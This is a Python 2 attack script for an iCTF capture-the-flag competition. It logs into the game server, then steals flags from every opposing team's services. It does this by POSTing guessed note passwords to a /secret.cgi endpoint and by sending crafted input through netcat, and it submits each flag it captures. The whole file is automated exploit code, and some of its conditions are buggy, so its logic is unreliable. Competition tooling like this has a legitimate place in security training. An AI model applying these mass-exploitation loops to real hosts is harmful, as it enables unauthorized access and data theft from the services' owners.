#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from ictf import iCTF
import os
import sys
import httplib
import commands
import re

argc = len(sys.argv)
if argc < 0:
    print "no input given"
    print "1st arg is the parameter list which will be sent to all the users"
    exit(0)
else:
    service_name = []
    service_id = []
    with open("secret.txt", 'r') as f:
        username = f.readline().strip()
        passwd = f.readline().strip()
    i=iCTF("http://35.167.152.77/")
    t = i.login(username,passwd)

    services = t.get_service_list()

    print "Number of Services are:" + str(len(services))

    c_services = []
    for service in services:
        if service['service_name'].find("web",0,len(service['service_name'])):
            print service['service_name']
            service_name.append(service['service_name'])
            service_id.append(service['service_id'])

        if service['service_name'].find("c",0,len(service['service_name'])):
            print service['service_name']
            service_name.append(service['service_name'])
            c_services.append(service['service_id'])

    flags = " "

    for elem in service_id:
        targets = t.get_targets(elem)
        for target in targets['targets']:
            hostname  = target['hostname']
            flag_id = target['flag_id']
            port = target['port']
            httpServ = httplib.HTTPConnection(hostname, port)
            httpServ.connect()
            httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(flag_id))
            response = httpServ.getresponse().read()
            flag = response.strip()
            flag = re.findall("\FLG\w+", flag)
            if len(flag) > 0:
                flag = flag[0]
                flags += flag + " "
                t.submit_flag([flag])
            httpServ.close()    
    print flags

    for elem in c_services:
        targets = t.get_targets(elem)
        for target in targets['targets']:
            hostname  = target['hostname']
            flag_id = target['flag_id']
            port = target['port']

            out = commands.getoutput('echo "X {}" | nc {} {}'.format(flag_id, hostname, port))

            flag = re.findall("\FLG\w+", out)
            if len(flag) > 0:
                flag = flag[0]
                flags += flag + " "
                t.submit_flag([flag])
    print flags


